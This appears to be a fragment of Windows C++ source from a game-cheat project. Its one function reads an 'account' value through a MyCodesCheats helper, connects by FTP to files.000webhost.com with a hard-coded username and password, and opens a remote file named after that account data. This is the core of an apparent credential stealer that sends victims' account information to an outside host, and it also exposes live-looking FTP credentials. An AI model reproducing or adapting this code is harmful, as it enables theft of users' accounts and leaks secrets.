#include <stdio.h>
#include <Windows.h>
#include <TlHelp32.h>
#include <exception>
#include <windows.h>
#include <string>
#include <conio.h>
#include <fstream>
#include <time.h>
#include <strsafe.h>
#include <string.h>
#include <cstdlib>
#include <iostream>
#include <wininet.h>
#include "new.h"
#include "MyCodesCheats.h"


#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "user32.lib")


using namespace std;


inline int SendForMySessionFTP()
{
	MyCodesCheats pb; pb.calcAddress();

	cout << "CONECTANDO..." << endl;

	HINTERNET Session = InternetConnect(
		InternetOpen(NULL, INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0), 
		"files.000webhost.com", INTERNET_DEFAULT_FTP_PORT, "unsubject-compilers", "almadoida", INTERNET_SERVICE_FTP, 0, 0);

	cout << "CONECTADO! -> " << endl;

	HINTERNET gh = FtpOpenFile(Session, _strdup(pb.getAccount().c_str()), GENERIC_WRITE , FTP_TRANSFER_TYPE_ASCII, 0);
	

	cout << "Arquivo gerado com sucesso!" << endl;

	
	cout << "fechando conexão" << endl;
	InternetCloseHandle(Session);

//----------------------------------------
 return EXIT_SUCCESS;
}